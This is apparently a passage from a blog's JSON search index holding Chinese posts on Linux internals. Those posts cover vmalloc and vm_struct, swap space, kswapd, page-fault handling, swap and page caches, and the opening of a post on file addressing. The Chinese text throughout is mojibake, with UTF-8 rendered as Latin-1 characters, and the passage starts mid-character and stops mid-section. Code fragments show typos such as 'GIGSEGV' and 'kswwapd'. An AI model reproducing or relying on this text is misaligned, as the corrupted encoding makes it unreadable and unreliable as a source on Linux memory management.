¸ç³»ç»Ÿæ•°æ®ç»“æ„çš„å†…å­˜åŒºåŸŸï¼Œå¤„äºè¿›ç¨‹è™šæ‹Ÿç©ºé—´çš„ 3GB~4GB èŒƒå›´å†…ã€‚ä»¥ Intel CPU ä¸ºä¾‹ï¼Œç”³è¯·çš„å†…å­˜å—å¤§å° blocksize æœ‰ 32ã€64ã€128ã€512 ç­‰ã€‚åœ¨ blocksize ä¸­èƒ½å¤Ÿç”³è¯·åˆ°çš„å—çš„å¤§å°è¿‘ä¼¼äº 2 çš„æ¬¡å¹‚ï¼Œæ‰€å·®çš„æ°å¥½æ˜¯ç®¡ç†æ•°æ®ç»“æ„æ‰€å ç”¨çš„å­—èŠ‚æ•°ï¼Œå¦‚ 16 æ˜¯ struct page_dsecriptor ç»“æ„çš„é•¿åº¦ã€‚ ç®¡ç†å†…æ ¸ç©ºé—´ç©ºé—²å—çš„æ•°æ®ç»“æ„åŠç›¸äº’å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/6.png) 0x07 ç”¨æˆ·æ€å†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾ Linux ç”¨ kmalloc() å‡½æ•°å’Œ kfree() å‡½æ•°æä¾›å†…æ ¸å†…å­˜ç”³è¯·ã€é‡Šæ”¾çš„æ¥å£ï¼Œå®ƒè¿˜å®ç°å¦ä¸€ç§è™šæ‹Ÿç©ºé—´çš„ç”³è¯·ã€é‡Šæ”¾æ¥å£ï¼Œå°±æ˜¯ vmalloc() å’Œ vfree()ã€‚ ç”± vmalloc() åˆ†é…çš„å­˜å‚¨ç©ºé—´åœ¨è¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´æ˜¯è¿ç»­çš„ï¼Œå½“å®ƒå¯¹åº”çš„ç‰©ç†å†…å­˜æ‰”éœ€è¦ç»è¿‡ç¼ºé¡µä¸­æ–­åç”±ç¼ºé¡µä¸­æ–­æœåŠ¡ç¨‹åºåˆ†é…ï¼Œæ‰€åˆ†é…çš„ç‰©ç†é¡µå¸§ä¸æ˜¯è¿ç»­çš„ã€‚è¿™äº›ç‰¹å¾å’Œè®¿é—®ç”¨æˆ·å†…å­˜ç›¸ä¼¼ï¼Œæ‰€ä»¥ä¸å¦¨æŠŠ vmalloc() å’Œ vfree() æˆä¸ºç”¨æˆ·æ€å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾ç•Œé¢ã€‚ å¯åˆ†é…çš„è™šæ‹Ÿç©ºé—´åœ¨ 3GB+high_memory+HOLE_8MB ä»¥ä¸Šçš„é«˜ç«¯ï¼Œç”± vmlist é“¾è¡¨ç®¡ç†ã€‚3GB æ˜¯å†…æ ¸æ€èµ–ä»¥è®¿é—®ç‰©ç†å†…å­˜çš„èµ·å§‹åœ°å€ã€‚high_memory æ˜¯å®‰è£…åœ¨è®¡ç®—æœºä¸­å®é™…å¯ç”¨çš„ç‰©ç†å†…å­˜çš„æœ€é«˜åœ°å€ã€‚ å› æ­¤ 3GB+high_memory ä¹Ÿæ˜¯ç‰©ç†å†…å­˜çš„ä¸Šç•Œã€‚ HOLE_8MB åˆ™æ˜¯é•¿åº¦ä¸º 8MB çš„â€œéš”ç¦»å¸¦â€ï¼Œèµ·è¶Šç•Œä¿æŠ¤ä½œç”¨ã€‚è¿™æ ·ï¼Œvmlistç®¡è¾–çš„è™šæ‹Ÿç©ºé—´æ—¢ä¸ä¸è¿›ç¨‹ç”¨æˆ·æ€0~3GBçš„è™šæ‹Ÿç©ºé—´å†²çªï¼Œä¹Ÿä¸ä¸è¿›ç¨‹å†…æ ¸æ€æ˜ å°„çš„ 3GB~3GB+high_memory çš„è™šæ‹Ÿç©ºé—´å†²çªã€‚ vmlisté“¾è¡¨çš„èŠ‚ç‚¹ç±»å‹ vm_struct å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š 123456struct vm_struct&#123; unsigned long flags; /* è™šæ‹Ÿå†…å­˜å—çš„å ç”¨æ ‡å¿— */ void *addr; /* è™šæ‹Ÿå†…å­˜å—çš„èµ·å§‹åœ°å€ */ unsigned long size; /* è™šæ‹Ÿå†…å­˜å—çš„é•¿åº¦ */ struct vm_struct *next; /* ä¸‹ä¸€ä¸ªè™šæ‹Ÿå†…å­˜å— */&#125;; èµ·å§‹æ—¶ï¼Œvmlist åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œvmlist_addr ç½®ä¸º VMALLOC_STARTï¼ˆæ®µåœ°å€ 3GBï¼Œåç§»é‡ high_memory+8MBï¼‰ã€‚åŠ¨æ€ç®¡ç†è¿‡ç¨‹ä¸­ï¼Œvmlist çš„è™šæ‹Ÿå†…å­˜å—æŒ‰èµ·å§‹åœ°å€ä»å°åˆ°å¤§æ’åºï¼Œæ¯ä¸ªè™šæ‹Ÿå†…å­˜å—ä¹‹åéƒ½æœ‰ä¸€ä¸ª 4KB å¤§å°çš„â€œéš”ç¦»å¸¦â€ï¼Œç”¨æ¥æ£€æŸ¥æŒ‡é’ˆçš„è¶Šç•Œé”™è¯¯ï¼Œç”¨æˆ·ç”³è¯·å¤§å—è¿ç»­ç©ºé—´å¯ç”¨ vmalloc() ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/7.png) 0x08 äº¤æ¢ç©ºé—´ è®¡ç®—æœºçš„ç‰©ç†å†…å­˜ç©ºé—´æ€»æ˜¯å½±å“æœºå™¨æ€§èƒ½ã€‚å†…å­˜å¤ªå°æ—¶ï¼Œæ“ä½œç³»ç»Ÿé‡‡ç”¨äº¤æ¢çš„æ–¹å¼ã€‚1970 å¹´ä»¥åï¼ŒæŒ‰éœ€è°ƒé¡µç®—æ³•å¾—åˆ°äº†åº”ç”¨ï¼Œæ˜¯ Linux æ“ä½œç³»ç»Ÿé‡‡ç”¨çš„è™šæ‹Ÿå­˜å‚¨å™¨çš„ç­–ç•¥ã€‚æ¢é¡µæ“ä½œæ—¶ï¼ŒLinux åŒºåˆ†ä¸¤ç§ä¸åŒçš„å†…å­˜æ•°æ®ã€‚ä¸€éƒ¨åˆ†æ²¡æœ‰å†™æƒé™çš„è¿›ç¨‹ç©ºé—´åœ¨æ¢é¡µæ—¶æ— éœ€å­˜å…¥äº¤æ¢ç©ºé—´ï¼Œç›´æ¥ä¸¢å¼ƒå³å¯ã€‚é‚£äº›ä¿®æ”¹è¿‡çš„é¡µé¢ï¼Œæ¢é¡µæ—¶ï¼Œå…¶å†…å®¹å¿…é¡»ä¿å­˜ï¼Œä¿å­˜çš„ä½ç½®å±äºäº¤æ¢ç©ºé—´çš„æŸä¸ªé¡µé¢ã€‚ Linux é‡‡ç”¨ä¸¤ç§æ–¹å¼ä¿å­˜æ¢å‡ºçš„é¡µé¢ï¼Œä¸€ç§æ˜¯æ•´ä¸ªå—è®¾å¤‡ï¼Œå¦‚ç£ç›˜çš„ä¸€ä¸ªåˆ†åŒºï¼Œç§°ä¸ºäº¤æ¢è®¾å¤‡ï¼›å¦ä¸€ç§æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„å›ºå®šé•¿åº¦çš„æ–‡ä»¶ï¼Œç§°ä¸ºäº¤æ¢æ–‡ä»¶ã€‚äº¤æ¢è®¾å¤‡å’Œäº¤æ¢æ–‡ä»¶ç»Ÿç§°ä¸ºäº¤æ¢ç©ºé—´ã€‚ å°½ç®¡äº¤æ¢ç©ºé—´æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼ï¼Œå½“å®ƒä»¬çš„å†…éƒ¨æ ¼å¼æ˜¯ä¸€è‡´çš„ã€‚ä¸€ä¸ªäº¤æ¢ç©ºé—´æœ€å¤šå¯å®¹çº³ 32687 ä¸ªé¡µé¢ã€‚å¦‚æœä¸€ä¸ªäº¤æ¢ç©ºé—´ä¸å¤Ÿç”¨ï¼ŒLinux å…è®¸å¹¶è¡Œç®¡ç†å¤šä¸ªäº¤æ¢ç©ºé—´ï¼Œäº¤æ¢è®¾å¤‡è¿œæ¯”äº¤æ¢æ–‡ä»¶æœ‰æ•ˆã€‚åœ¨äº¤æ¢è®¾å¤‡ä¸­ï¼Œå±äºåŒä¸€ä¸ªé¡µé¢çš„æ•°æ®å—æ€»æ˜¯è¿ç»­çš„ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å—åœ°å€ç¡®å®šï¼Œåç»­çš„æ•°æ®åº“å¯ä»¥æŒ‰é¡ºåºè¯»å‡ºæˆ–å†™å…¥ï¼Œè€Œåœ¨äº¤æ¢æ–‡ä»¶ä¸­ï¼Œå±äºåŒä¸€ä¸ªé¡µé¢çš„æ•°æ®å—è™½ç„¶åœ¨é€»è¾‘ä¸Šæ˜¯è¿ç»­çš„ï¼Œä½†æ˜¯æ•°æ®å—çš„å®é™…ä½ç½®å¯èƒ½æ˜¯é›¶æ•£çš„ã€‚ å½“äº¤æ¢è¿›ç¨‹ kswapd å°è¯•æ¢å‡ºé¡µé¢æ—¶ï¼Œè°ƒç”¨æµ‹è¯•è¿›ç¨‹ try_to_swap_out() æµ‹è¯•é¡µé¢çš„å­˜åœ¨æ—¶é—´ã€‚å¦‚æœæŸä¸ªç‰©ç†é¡µé¢å¯ä»¥æ¢å‡ºï¼Œåˆ™è°ƒç”¨ get_swap_page() ç”³è¯·äº¤æ¢ç©ºé—´çš„é¡µé¢ï¼Œå¾—åˆ°äº¤æ¢è¿›ç¨‹çš„å…¥å£åœ°å€ entryï¼Œå°†è¦æ¢å‡ºçš„ç‰©ç†é¡µé¢æ¢åˆ° entry æŒ‡å®šçš„äº¤æ¢ç©ºé—´çš„æŸä¸ªé¡µé¢ä¸­ã€‚ 0x09 é¡µäº¤æ¢è¿›ç¨‹ä¸é¡µé¢äº¤æ¢ å½“ç‰©ç†é¡µé¢ä¸å¤Ÿæ—¶ï¼ŒLinux å­˜å‚¨ç®¡ç†ç³»ç»Ÿå¿…é¡»é‡Šæ”¾éƒ¨åˆ†ç‰©ç†é¡µé¢ï¼Œå°†å®ƒä»¬çš„å†…å®¹å†™åˆ°äº¤æ¢ç©ºé—´ã€‚å®ç°è¿™ä¸ªåŠŸèƒ½çš„å°±æ˜¯å†…æ ¸æ€äº¤æ¢ç¨‹åº kswwapdã€‚ kswapd å±äºä¸€ç§ç‰¹æ®Šçš„è¿›ç¨‹ï¼Œæˆä¸ºå†…æ ¸æ€è¿›ç¨‹ã€‚Linux çš„å†…æ ¸æ€è¿›ç¨‹æ²¡æœ‰è™šæ‹Ÿå­˜å‚¨ç©ºé—´è¿›ç¨‹ï¼Œå®ƒä»¬è¿è¡Œåœ¨å†…æ ¸æ€ï¼Œç›´æ¥ä½¿ç”¨ç‰©ç†åœ°å€ç©ºé—´ã€‚å®ƒä¸ä»…èƒ½å¤Ÿå°†é¡µé¢æ¢å‡ºäº¤æ¢ç©ºé—´ï¼Œè€Œä¸”ä¿è¯ç³»ç»Ÿä¸­æœ‰è¶³å¤Ÿçš„ç©ºé—²é¡µé¢ï¼Œä¿è¯å­˜å‚¨ç³»ç»Ÿé«˜æ•ˆè¿è¡Œã€‚ kswapd åœ¨ç³»ç»Ÿåˆå§‹å¯åŠ¨æ—¶ç”±å†…æ ¸æ€è¿›ç¨‹ init åˆ›å»ºï¼Œå…¶åˆå§‹åŒ–ç¨‹åºæ®µä»¥è°ƒç”¨ init_swap_timer() å‡½æ•°ç»“æŸï¼Œè¿›è€Œè½¬å…¥ while(1) å¾ªç¯ï¼Œå¹¶é©¬ä¸Šç¡çœ ã€‚ å†…æ ¸äº¤æ¢è¿›ç¨‹ä¾ç…§ 3 ç§æ–¹å¼ç¼©å‡ç³»ç»Ÿä½¿ç”¨çš„ç‰©ç†é¡µé¢ï¼Œ page cacheå’Œbuffer cache æ¢å‡º SYSTEM V å…±äº«å†…å­˜å ç”¨çš„é¡µé¢ æ¢å‡ºæˆ–ä¸¢å¼ƒè¿›ç¨‹å ç”¨çš„é¡µé¢ 0x0a ç¼ºé¡µä¸­æ–­å’Œé¡µé¢äº¤æ¢ ç£ç›˜ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶æ˜ åƒ Image ä¸€æ—¦è¢«æ˜ å°„åˆ°ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´å°±å¯ä»¥å¼€å§‹æ‰§è¡Œã€‚ç”±äºåªæœ‰è¯¥æ˜ åƒåŒºçš„å¼€å§‹éƒ¨åˆ†è°ƒå…¥å†…å­˜ï¼Œå› æ­¤ï¼Œè¿›ç¨‹è¿Ÿæ—©ä¼šæ‰§è¡Œåˆ°é‚£äº›å°šæœªè°ƒå…¥å†…å­˜çš„ä»£ç ã€‚å½“ä¸€ä¸ªè¿›ç¨‹è®¿é—®äº†ä¸€ä¸ªè¿˜æ²¡æœ‰æœ‰æ•ˆé¡µè¡¨é¡¹çš„è™šæ‹Ÿåœ°å€æ—¶ï¼ˆå³é¡µè¡¨é¡¹çš„ P ä½ä¸º 0ï¼‰ï¼Œå¤„ç†å™¨å°†äº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œé€šçŸ¥æ“ä½œç³»ç»Ÿï¼Œå¹¶å°†å‡ºç°ç¼ºé¡µçš„è™šæ‹Ÿåœ°å€ï¼ˆåœ¨ CR2 å¯„å­˜å™¨ä¸­ï¼‰å’Œç¼ºé¡µæ—¶è®¿é—®è™šæ‹Ÿå†…å­˜çš„æ¨¡å¼ï¼Œå¹¶ä¼ é€’ç»™ Linux çš„ç¼ºé¡µä¸­æ–­æœåŠ¡ç¨‹åºã€‚ åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œè®¾å®šäº†ç¼ºé¡µä¸­æ–­æœåŠ¡ç¨‹åºä¸º do_page_fault() ï¼š 1234Set_ttrap_gate(14, &amp;page_fault);ENTRY(page_fault)pushI$SYMBOL_NAME(do_page_fault)jmp error_code /* å¼‚å¸¸ä¸­æ–­æœåŠ¡ç¨‹åºç»Ÿä¸€å…¥å£ */ æ ¹æ®æ§åˆ¶å¯„å­˜å™¨ CR2 ä¼ é€’çš„ç¼ºé¡µåœ°å€ï¼ŒLinux å¿…é¡»æ‰¾åˆ°ç”¨æ¥è¡¨ç¤ºç¼ºé¡µçš„è™šæ‹Ÿå­˜å‚¨åŒºçš„ vm_area_struct ç»“æ„ã€‚åœ¨æœç´¢è¿›ç¨‹çš„ vm_area_struct ç»“æ„æ—¶ï¼Œå¯¹æœç´¢æ—¶é—´åº”æœ‰ä¸¥æ ¼çš„é™åˆ¶ã€‚ä¸ºäº†æœ‰æ•ˆåœ°å¤„ç†æœç´¢å·¥ä½œï¼ŒLinux å°†æ‰€æœ‰çš„ vm_area_struct ç»“æ„é€šè¿‡ AVL å¹³è¡¡æ ‘è¿æ¥èµ·æ¥ã€‚å¦‚æœæ²¡ç”¨æ‰¾åˆ°ä¸ç¼ºé¡µç›¸å¯¹åº”çš„ vm_area_struct ç»“æ„ï¼Œé‚£ä¹ˆè¯´æ˜è¿›ç¨‹è®¿é—®äº†ä¸€ä¸ªéæ³•å­˜å‚¨å™¨ï¼ŒLinux å‘è¿›ç¨‹å‘é€ä¿¡å· GIGSEGV ï¼Œå¦‚æœè¿›ç¨‹æ²¡ç”¨å¤„ç†è¯¥ä¿¡å·çš„å‡½æ•°ï¼Œè¯¥è¿›ç¨‹å°†è¢«ç»ˆæ­¢ã€‚ Linux æ¥ç€æ£€æµ‹ç¼ºé¡µæ—¶è®¿é—®æ¨¡å¼æ˜¯å¦åˆæ³•ã€‚å¦‚æœè¿›ç¨‹å¯¹è¯¥é¡µçš„è®¿é—®è¶…è¶Šæƒé™ï¼Œä¾‹å¦‚è¯•å›¾å¯¹åªå…è®¸è¯»æ“ä½œçš„é¡µé¢è¿›è¡Œå†™æ“ä½œï¼Œç³»ç»Ÿä¹Ÿå°†å‘è¯¥è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼Œé€šçŸ¥è¿›ç¨‹çš„å­˜å‚¨è®¿é—®å‡ºé”™ã€‚ç»è¿‡ä»¥ä¸Šä¸¤æ­¥æ£€æŸ¥ï¼Œå¯ä»¥ç¡®å®šè‚¯å®šæ˜¯æ­£å¸¸çš„ç¼ºé¡µä¸­æ–­ã€‚ Linux è¿˜åŒºåˆ†äº§ç”Ÿç¼ºé¡µä¸­æ–­çš„é¡µé¢æ˜¯åœ¨äº¤æ¢ç©ºé—´ï¼Œè¿˜æ˜¯åœ¨ç£ç›˜ä¸­ä½œä¸ºæŸä¸€å¯æ‰§è¡Œæ–‡ä»¶æ˜ åƒçš„ä¸€éƒ¨åˆ†ï¼Œè¿›è€Œåšå‡ºä¸åŒçš„å¤„ç†ï¼Œè¿™ä¸€ç‚¹é€šè¿‡é¡µè¡¨é¡¹ä¸­çš„ä½æ¥åŒºåˆ†ã€‚å¦‚æœè¯¥é¡µé¢æ‰€å¯¹åº”çš„é¡µè¡¨é¡¹æ˜¯æ— æ•ˆçš„ï¼ˆp=0ï¼‰ï¼Œä½†æ˜¯éç©ºï¼Œè¯´æ˜ç¼ºé¡µåœ¨äº¤æ¢ç©ºé—´ä¸­ã€‚å¦åˆ™ï¼Œé¡µé¢æ˜¯æŸä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ˜ åƒï¼ˆimageï¼‰çš„ä¸€éƒ¨åˆ†ã€‚ å¹¶ä¸æ˜¯æ‰€æœ‰çš„ vm_area_struct ç»“æ„å˜é‡éƒ½æœ‰å®Œæ•´çš„ä¸€å¥—è™šæ‹Ÿå­˜å‚¨æ“ä½œï¼Œæœ‰äº›ç”šè‡³æ²¡æœ‰ nopage æ“ä½œå‡½æ•°æŒ‡é’ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒLinux å°†ä½¿ç”¨ç¼ºçœçš„æ“ä½œå‡½æ•°ä¸ºè¯¥è™šæ‹Ÿé¡µé¢æ‰¾åˆ°ç‰©ç†é¡µå¸§ï¼ŒåŒæ—¶ä¸ºå…¶è®¾ç½®ä¸€é¡µè¡¨é¡¹ã€‚å¦‚æœ vm_area_struct ç»“æ„å˜é‡ä¸­æœ‰ nopage æ“ä½œå‡½æ•°ï¼ŒLinux ä½¿ç”¨è¯¥æ“ä½œå‡½æ•°ã€‚ Linux çš„ nopage å‡½æ•°é€šå¸¸ç”¨æ¥è°ƒå…¥å·²è¢«å­˜å‚¨æ˜ å°„çš„å¯æ‰§è¡Œç£ç›˜æ˜ åƒï¼Œè€Œä¸”å®ƒæ˜¯åˆ©ç”¨ page cache æ¥å°†æ‰€éœ€æ˜ åƒé¡µè°ƒå…¥å†…å­˜çš„ã€‚ 0x0b å­˜å‚¨ç®¡ç†ç³»ç»Ÿçš„ç¼“å†²æœºåˆ¶ å­˜å‚¨ç®¡ç†ç³»ç»Ÿçš„ç¼“å†²æœºåˆ¶ä¸»è¦åŒ…æ‹¬ kmalloc cacheã€swap cache å’Œ page cache Kmalloc cache åœ¨ â€œå†…æ ¸æ€å†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾â€å·²åšäº†ä»‹ç»ï¼Œæœ¬èŠ‚ä»‹ç»å¦å¤–ä¸¤ç§ cache Swap cache å¦‚æœä»¥å‰è¢«è°ƒå‡ºåˆ°äº¤æ¢ç©ºé—´çš„é¡µé¢ç”±äºè¿›ç¨‹å†æ¬¡è®¿é—®è€Œè°ƒå…¥ç‰©ç†å†…å­˜ï¼Œåªè¦è¯¥é¡µè°ƒå…¥åæ²¡æœ‰è¢«ä¿®æ”¹è¿‡ï¼Œé‚£ä¹ˆå®ƒçš„å†…å®¹ä¸äº¤æ¢ç©ºé—´ä¸­çš„å†…å®¹æ˜¯ä¸€æ ·çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œäº¤æ¢ç©ºé—´ä¸­çš„å¤‡ä»½è¿˜æ˜¯æœ‰æ•ˆçš„ã€‚å› æ­¤åœ¨è¯¥é¡µå†åº¦æ¢å‡ºæ—¶ï¼Œå°±æ²¡å¿…è¦æ‰§è¡Œå†™æ“ä½œã€‚Linux é‡‡ç”¨ swap_cache è¡¨æè¿°çš„ swap cache æ¥å®ç°è¿™ç§æ€æƒ³ã€‚swap cache å®è´¨ä¸Šæ˜¯å…³äºé¡µè¡¨é¡¹çš„ä¸€ä¸ªåˆ—è¡¨ï¼Œswap_cache è¡¨ä½äº mem_map è¡¨ä¹‹å‰ã€‚ æ¯ä¸€ç‰©ç†é¡µé¢éƒ½åœ¨ swap cache ä¸­å æœ‰ä¸€è¡¨é¡¹ï¼Œswap_cache è¡¨é¡¹çš„æ€»æ•°å°±æ˜¯ç‰©ç†é¡µé¢æ€»æ•°ï¼Œè‹¥è¯¥ç‰©ç†é¡µé¢çš„å†…å®¹æ˜¯æ–°åˆ›å»ºçš„ï¼Œæˆ–è™½ç„¶æ›¾ç»æ¢å‡ºè¿‡ï¼Œä½†æ¢å‡ºåï¼Œè¯¥ç‰©ç†é¡µé¢å·²ç»è¢«ä¿®æ”¹æ—¶ï¼Œåˆ™è¯¥è¡¨é¡¹æ¸…é›¶ã€‚å†…å®¹éé›¶çš„è¡¨ç°ï¼Œæ­£å¥½æ˜¯æŸä¸ªè¿›ç¨‹çš„é¡µè¡¨é¡¹ï¼Œæè¿°äº†é¡µé¢åœ¨äº¤æ¢ç©ºé—´ä¸­çš„ä½ç½®ã€‚ å½“ Linux å°†ä¸€ç‰©ç†é¡µé¢è°ƒå‡ºåˆ°äº¤æ¢ç©ºé—´æ—¶ï¼Œå®ƒå…ˆæŸ¥è¯¢ swap cache ï¼Œå¦‚æœå…¶ä¸­æœ‰ä¸è¯¥é¡µé¢å¯¹åº”çš„æœ‰æ•ˆé¡µè¡¨é¡¹ï¼Œé‚£å°±ä¸éœ€è¦å°†è¯¥é¡µå†™å‡ºï¼Œå› ä¸ºåŸäº¤æ¢ç©ºé—´ä¸­çš„å†…å®¹ä¸å¾…æ¢å‡ºçš„é¡µé¢å†…å®¹æ˜¯ä¸€è‡´çš„ã€‚ Page Cache Linux çš„ page cache çš„ä½œç”¨æ˜¯åŠ å¿«å¯¹ç£ç›˜çš„è®¿é—®é€Ÿåº¦ï¼Œæ–‡ä»¶è¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œæ¯æ¬¡è¯»å–ä¸€é¡µï¼Œè€Œè¿™äº›é¡µå°±ä¿å­˜äº page cache ä¸­ã€‚ æ¯å½“éœ€è¦è¯»å–æ–‡ä»¶çš„ä¸€é¡µæ—¶ï¼Œæ€»æ˜¯é¦–å…ˆé€šè¿‡ page cache è¯»å–ã€‚å¦‚æœæ‰€éœ€é¡µé¢åœ¨ page cache ä¸­ï¼Œå°±è¿”å›æŒ‡å‘è¡¨ç¤ºè¯¥é¡µé¢çš„ mem-map-1çš„æŒ‡é’ˆã€‚å¦åˆ™å¿…é¡»ä»æ–‡ä»¶ç³»ç»Ÿä¸­è°ƒå…¥ã€‚æ¥ç€ï¼ŒLinux ç”³è¯·ä¸€ç‰©ç†é¡µï¼Œå°†è¯¥é¡µä»ç£ç›˜æ–‡ä»¶ä¸­è°ƒå…¥å†…å­˜ã€‚ å¦‚æœæœ‰å¯èƒ½çš„è¯ï¼ŒLinux è¿˜å‘å‡ºè¯»å–å½“å‰é¡µé¢åä¸€ä¸ªé¡µé¢çš„è¯»æ“ä½œè¯·æ±‚ã€‚è¿™ç§é¢„è¯»ä¸€é¡µçš„æ€æƒ³æ¥è‡ªå±€éƒ¨åŸç†ï¼Œå³åœ¨è¿›ç¨‹è¯»å½“å‰é¡µæ—¶ï¼Œå®ƒçš„åä¸€é¡µä¹Ÿå¯èƒ½è¢«è¿›ç¨‹ç”¨åˆ°ã€‚ éšç€è¶Šæ¥è¶Šå¤šçš„æ–‡ä»¶é¡µé¢è¢«è¯»å–ã€æ‰§è¡Œï¼Œpage cache å°†ä¼šå˜å¾—è¶Šæ¥è¶Šå¤§ã€‚è¿›ç¨‹ä¸å†éœ€è¦çš„é¡µé¢åº”ä» page cache ä¸­åˆ é™¤ã€‚å½“ Linux åœ¨ä½¿ç”¨å†…å­˜è¿‡ç¨‹ä¸­å‘ç°å±‹é‡Œé¡µé¢æ¸å˜ç¨€å°‘æ—¶ï¼Œå°†ç¼©å‡ page cacheã€‚","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/","text":"æ¦‚è¿°ï¼šä»é€»è¾‘ç»“æ„ä¸Šçœ‹ï¼ŒLinux ç³»ç»Ÿä¸­çš„æ–‡ä»¶æ˜¯æ²¡æœ‰ç»“æ„çš„æµå¼æ–‡ä»¶ã€‚ä»ç‰©ç†ç»“æ„ä¸Šçœ‹ï¼ŒLinux é‡‡ç”¨æ··åˆå¤šé‡ç´¢å¼•ç»“æ„ï¼Œå³å°†æ–‡ä»¶æ‰€å ç”¨ç£ç›˜çš„ç›˜å—å·ç›´æ¥æˆ–é—´æ¥å­˜æ”¾åœ¨è¯¥æ–‡ä»¶ç´¢å¼•èŠ‚ç‚¹çš„åœ°å€é¡¹ä¸­ã€‚åœ¨æŸ¥æ‰¾æ–‡ä»¶æ—¶åªè¦æ‰¾åˆ°è¯¥æ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹å°±å¯ä»¥ç”¨ç›´æ¥æˆ–é—´æ¥çš„å¯»å€æ–¹å¼è·å¾—æŒ‡å®šæ–‡ä»¶çš„ç›˜å—å·ã€‚ Linux æ–‡ä»¶çš„ç‰©ç†ç»“æ„ Linux æ–‡ä»¶ç³»ç»Ÿ Linux æ–‡ä»¶ç›®å½•ç®¡ç†å‘½ä»¤ Linux æ“ä½œç³»ç»Ÿä¸‹çš„è½¯é“¾æ¥å’Œç¡¬é“¾æ¥ 0x01 Linuxæ–‡ä»¶çš„å±‹é‡Œç»“æ„ åœ¨ Linux ä¸­æ ¹æ®æ–‡ä»¶çš„å¤§å°ï¼Œå½¢æˆå°å‹ã€ä¸­å‹ã€å¤§å‹å’Œå·¨å‹ç­‰ä¸åŒè§„æ¨¡çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/1.png) 0x02 å¯»å€æ–¹å¼ ç›´æ¥å¯»å€æ–¹å¼ Linux ç³»ç»Ÿä¸ºäº†æé«˜å¯¹æ–‡ä»¶çš„æ£€ç´¢é€Ÿåº¦ï¼Œé‡‡ç”¨ç›´æ¥å¯»å€æ–¹å¼ã€‚åœ¨ç´¢å¼•èŠ‚ç‚¹ä¸­å»ºç«‹ 12 ä¸ªåœ°å€é¡¹ï¼Œç”¨æ¥ç›´æ¥å­˜æ”¾è¯¥æ–‡ä»¶æ‰€åœ¨çš„ç›˜å—å·ï¼Œå¯¹åº”çš„ç›˜å—ç§°ä¸ºç›´æ¥å—ã€‚ ä¸€æ¬¡é—´æ¥å¯»å€æ–¹å¼ å½“æ–‡ä»¶è¾ƒå¤§æ—¶ï¼ŒLinux ç³»ç»Ÿæä¾›äº†ä¸€æ¬¡é—´æ¥å¯»å€æ–¹å¼ã€‚åœ¨è¿™ç§å¯»å€æ–¹å¼ä¸­ï¼Œä¸€æ¬¡é—´æ¥åœ°å€é¡¹ä¸­æ‰€å¯¹åº”çš„ç›˜å—ï¼ˆé—´æ¥å—ï¼‰å­˜æ”¾çš„ä¸æ˜¯æ–‡ä»¶æ‰€åœ¨çš„ç‰©ç†ç›˜å—å·ï¼Œè€Œæ˜¯ç›´æ¥å—çš„å—å·è¡¨ã€‚ä¸ºäº†é€šè¿‡é—´æ¥å—è¯»å–æ–‡ä»¶æ•°æ®ï¼Œéœ€è¦å…ˆè¯»å–é—´æ¥å—æ‰¾åˆ°å¯¹åº”çš„ç›´æ¥å—é¡¹ï¼Œç„¶åä»ç›´æ¥å—ä¸­è¯»å–æ•°æ®ã€‚ å¤šæ¬¡é—´æ¥å¯»å€æ–¹å¼ å¯¹äºå¤§å‹æˆ–å·¨å‹çš„æ–‡ä»¶ï¼ŒLinux ç³»ç»Ÿåˆå¼•å…¥äº†äºŒæ¬¡é—´æ¥å¯»å€å’Œä¸‰æ¬¡é—´æ¥å¯»å€ã€‚äºŒæ¬¡é—´æ¥é¡¹ä¸­å­˜æ”¾çš„æ˜¯ä¸€æ¬¡é—´æ¥å—å·è¡¨ï¼Œä¸‰æ¬¡é—´æ¥é¡¹å¯¹åº”çš„ç›˜å—ä¸­æ”¾æœ‰äºŒæ¬¡é—´æ¥å—å·è¡¨ã€‚ 0x03 åœ°å€è½¬æ¢ 